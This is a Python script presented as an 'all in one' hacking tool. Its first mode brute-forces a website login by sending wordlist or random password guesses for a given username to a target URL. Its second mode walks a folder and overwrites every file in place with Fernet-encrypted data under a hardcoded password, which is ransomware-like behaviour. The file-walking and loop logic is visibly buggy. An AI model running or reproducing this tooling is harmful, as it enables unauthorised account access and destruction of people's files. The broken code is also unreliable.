# ----------Banner--------
import pyfiglet
from pyfiglet import Figlet

# ----------Fernet imports----------
import base64
import os
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet, InvalidToken
import hashlib

# -----------Brute Force imports-------
import requests
import random


class AllinOne:
    def HackTools(Elvo):
        custom_fig = Figlet(font='5lineoblique')
        print(custom_fig.renderText("Welcome To Elvo All In One Tool"))
        custom_menu = Figlet(font='digital')
        print(custom_menu.renderText('''
    1.For Brute-Force Enter 1
    2.For Fernet Encryption Enter 2
 '''))
        User_Choice = input("And your choice would be?\n...: ")
        print("You chose...: ", User_Choice)

        # Test module!
        # if User_Choice == 'BRUTE FORCE':
        #     print("Nice")
        # elif User_Choice == 'AES':
        #     print("Nice")
        # else:
        #     print("Not an option :(")

        # -----------------------Brute Force-----------------------
        if User_Choice == '1':
            def QUESTIONBRUTEFORCE():
                custombruteforce = Figlet(font='bubble')

                print(custombruteforce.renderText("Welcome To Elvo\n "
                                                  "Encryptor"))

                BruteIntro = print('''How would you like to Brute Force?

        1.With a Worldlist [1]
        2.With Random Numbers[2]
        3.With Your Own Characters[3]
    ''')

                BruteChoice = input(str("And your choice would be?\n...: "))
                print("You chose...: ", BruteChoice)

                if BruteChoice == "1":

                    url = input('Place the URL: ')
                    username = input('Place the username: ')

                    # chars =  "123"

                    def send_request(username, passwd):
                        data = {
                            "username": username,
                            "password": passwd
                        }

                        r = requests.get(url, data=data)
                        return r

                    def implist():
                        print('ADD .txt TO THE FILE!')
                        worldlist = input('Wordlist Path...: ')
                        try:
                            file = open(worldlist, 'r')
                            tries = file.read().split('\n')
                            file.close()
                            return tries
                        except FileNotFoundError:
                            return print('\nsomething is incorrect :( Try again :)\n'), QUESTIONBRUTEFORCE()

                    def main(tries):
                        for passwd in tries:
                            r = send_request(username, passwd)

                            if 'failed to login' in r.text.lower():
                                print(f"Incorrect {passwd}\n")
                            else:
                                print(f"Correct Password | {passwd} | !\n")
                                break

                    tries = implist()
                    main(tries)

                elif BruteChoice == "2":

                    url = input('Place the URL: ')
                    username = input('Place the username: ')
                    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
                    try:

                        def send_request(username, passwd):
                            data = {
                                "username": username,
                                "password": passwd
                            }

                            r = requests.get(url, data=data)
                            return r

                        def main():
                            while True:
                                rndpasswd = random.choices(chars, k=2)
                                # k= is the password length.
                                passwd = "".join(rndpasswd)
                                # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
                                r = send_request(username, passwd)

                                if 'failed to login' in r.text.lower():
                                    print(f"Incorrect {passwd}\n")
                                else:
                                    print(f"Correct Password | {passwd} | !\n")
                                    break

                        main()
                    except requests.exceptions.MissingSchema:
                        return print('\nsomething is incorrect :( Try again :)\n'), QUESTIONBRUTEFORCE()

                elif BruteChoice == "3":

                    url = input('Place the URL: ')
                    username = input('Place the username: ')
                    chars = input('Write the characters to use')
                    try:

                        def send_request(username, passwd):
                            data = {
                                "username": username,
                                "password": passwd
                            }

                            r = requests.get(url, data=data)
                            return r

                        def main():
                            while True:
                                rndpasswd = random.choices(chars, k=2)
                                # k= is the password length.
                                passwd = "".join(rndpasswd)
                                # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
                                r = send_request(username, passwd)

                                if 'failed to login' in r.text.lower():
                                    print(f"Incorrect {passwd}\n")
                                else:
                                    print(f"Correct Password | {passwd} | !\n")
                                    break

                        main()
                    except requests.exceptions.MissingSchema:
                        return print('\nsomething is incorrect :( Try again :)\n'), QUESTIONBRUTEFORCE()

                else:
                    print("That's not one of the options... start again\n")
                    return QUESTIONBRUTEFORCE()

            QUESTIONBRUTEFORCE()
        # -----------------------Brute Force-----------------------

        # -----------------------Fernet-----------------------
        elif User_Choice == '2':
            custombruteforce = Figlet(font='bubble')
            print(custombruteforce.renderText("Welcome To Elvo\n "
                                              "Encryptor"))

            # ---------Generate Key-------------

            try:
                file = open('fernetkey.key', 'rb')
                key = file.read()
                file.close()
            except FileNotFoundError:
                key = Fernet.generate_key()
                file = open('fernetkey.key', 'wb')
                file.write(key)
                file.close()

            password_provided = "password"  # This is input in the form of a string
            password = password_provided.encode()  # Convert to type bytes
            salt = b'\n\x8dl\xfb&\x92\x86\xa6\x9e\xfb!\xec\xeb\x02\xcc\xee'
            # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
                backend=default_backend()
            )
            key = base64.urlsafe_b64encode(kdf.derive(password))  # Can only use kdf once

            def QUESTIONFERNET():

                FERNETQUESTION = input("\nWhat woud you like to do?\n"
                                       "To Encrypt[1]\nTo Decrypt[2]\n...:")

                if FERNETQUESTION == '1':
                    # TODO: --------------Encryption--------------
                    folderpath = input('Place the Folder Path...: ')
                    looptimes = input('How many times to run...: ')
                    try:
                        number = int(looptimes)
                        pass
                    except ValueError:
                        print('\nThats not a number...\n')
                        return QUESTIONFERNET()
                    if number <= 0:
                        number = 1

                    counter = 1
                    complete_files = []
                    for root, dir_names, file_names in os.walk(folderpath):
                        for f in file_names:
                            complete_files.append(os.path.join(root, f))

                        for times in range(number):
                            for file in complete_files:
                                fullpath = f'{file}'

                            input_file = fullpath
                            with open(input_file, 'rb') as f:
                                data = f.read()  # Read the bytes of the input file
                                base64encoding = base64.b64encode(str(input_file).encode('ascii'))
                                SHA256encoding = hashlib.sha256(str(input_file).encode('UTF-8')).hexdigest()
                                counter += 1

                            fernet = Fernet(key)
                            encrypted = fernet.encrypt(data)

                            with open(input_file, 'wb') as f:
                                f.write(encrypted)  # Write the encrypted bytes to the output file

                            print(
                                f'File Name...:{file}\nFile Number...:{counter}Looptime...:{times}\nBase64...:{base64encoding}\nSHA256...: {SHA256encoding}\n\n --------next file--------\n')

                elif FERNETQUESTION == '2':

                    # TODO: ------------------DECRYPTION--------------------

                    Question = input("Are you sure? Yes/No...: ").capitalize()
                    if Question == 'Yes':
                        folderpath = input('Place the Folder Path...: ')
                        looptimes = input('How many times to run...: ')
                        try:
                            number = int(looptimes)
                            pass
                        except ValueError:
                            print('\nThats not a number...\n')
                            return QUESTIONFERNET()
                        if number <= 0:
                            number = 1

                        counter = 1
                        complete_files = []
                        for root, dir_names, file_names in os.walk(folderpath):
                            for f in file_names:
                                complete_files.append(os.path.join(root, f))

                            for times in range(number):
                                for file in complete_files:
                                    fullpath = f'{file}'

                                input_file = fullpath

                                with open(input_file, 'rb') as f:
                                    data = f.read()
                                    counter += 1

                                fernet = Fernet(key)
                                try:
                                    decrypted = fernet.decrypt(data)

                                    with open(input_file, 'wb') as f:
                                        f.write(decrypted)
                                        print(
                                            f'File Name...:{file}\nFile Number...:{counter}\nLooptimes...:{times}\n --------next file--------\n')


                                except InvalidToken as e:
                                    print("No more files to decrypt :)")

                    else:
                        print("That's not one of the options... start again\n")
                        return QUESTIONFERNET()


                else:
                    return print('NOT AN OPTION TRY AGAIN!'), QUESTIONFERNET()

            QUESTIONFERNET()
            # -----------------------Fernet-----------------------





        else:
            print("\nNot an option :( , Try again...\n")
            return object.HackTools('Elvo.a')


object = AllinOne
object.HackTools('Elvo.a')
